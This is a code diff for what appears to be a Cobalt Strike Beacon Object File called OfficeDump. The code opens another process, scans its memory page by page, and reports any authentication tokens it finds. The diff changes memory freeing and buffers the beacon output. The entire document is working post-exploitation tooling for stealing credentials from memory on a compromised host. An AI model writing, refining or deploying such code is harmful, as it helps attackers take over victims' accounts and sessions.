@@ -1,6 +1,8 @@
 #include <General.hpp>
 
 auto OfficeDump( ULONG ProcessId ) -> VOID {
+    auto BeaconFmt     = Format{ 0 };
+    auto FormatSize    = INT32{ 0 };
     auto ProcessHandle = INVALID_HANDLE_VALUE;
     auto MmAddress     = PBYTE{ nullptr };
     auto MmInformation = MEMORY_BASIC_INFORMATION{ 0 };
@@ -11,22 +13,26 @@ auto OfficeDump( ULONG ProcessId ) -> VOID {
     
     auto Cleanup = [&]() -> VOID {
         if ( ReadBuffer ) {
-            Mem::Free( ReadBuffer ); ReadBuffer = nullptr;
+            HeapFree( GetProcessHeap(), 0, ReadBuffer ); ReadBuffer = nullptr;
         }
         
         if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
             CloseHandle( ProcessHandle ); ProcessHandle = INVALID_HANDLE_VALUE;
         }
+
+        BeaconFormatFree( &BeaconFmt );
     };
+
+    BeaconFormatAlloc( &BeaconFmt, 0x1000 );
     
     ProcessHandle = OpenProcess( 
         PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessId 
     );
     if ( ProcessHandle == INVALID_HANDLE_VALUE || ProcessHandle == nullptr ) {
-        BeaconPrintf( CALLBACK_ERROR, "Failed to open process %d: %d", ProcessId, GetLastError() ); return;
+        BeaconFormatPrintf( &BeaconFmt, "Failed to open process %d: %d", ProcessId, GetLastError() ); return;
     }
     
-    BeaconPrintf( CALLBACK_OUTPUT, "Scanning process %d for tokens...", ProcessId );
+    BeaconFormatPrintf( &BeaconFmt, "Scanning process %d for tokens...\n", ProcessId );
     
     while ( TRUE ) {
         PageInterval = VirtualQueryEx( 
@@ -34,7 +40,7 @@ auto OfficeDump( ULONG ProcessId ) -> VOID {
             sizeof( MEMORY_BASIC_INFORMATION ) 
         );
         if ( PageInterval == 0 ) {
-            BeaconPrintf( CALLBACK_OUTPUT, "Memory scan completed" ); break;
+            BeaconFormatPrintf( &BeaconFmt, "Memory scan completed\n" ); break;
         }
         
         MmAddress = static_cast<PBYTE>( MmInformation.BaseAddress ) + MmInformation.RegionSize;
@@ -56,7 +62,7 @@ auto OfficeDump( ULONG ProcessId ) -> VOID {
         }
         
         if ( ReadBuffer ) {
-            Mem::Free( ReadBuffer );
+            HeapFree( GetProcessHeap(), 0, ReadBuffer );
             ReadBuffer = nullptr;
         }
         
@@ -107,12 +113,14 @@ auto OfficeDump( ULONG ProcessId ) -> VOID {
                 }
                 
                 if ( TokenLength > 20 ) {
-                    BeaconPrintf( CALLBACK_OUTPUT, "Token found: %.*S", static_cast<int>( TokenLength ), ReadBuffer + i );
+                    BeaconFormatPrintf( &BeaconFmt, "Token found: %.*S\n", static_cast<int>( TokenLength ), ReadBuffer + i );
                 }
                 i += TokenLength;
             }
         }
     }
+
+    BeaconPrintf(CALLBACK_OUTPUT, BeaconFormatToString(&BeaconFmt, &FormatSize));
     
     return Cleanup();
 }
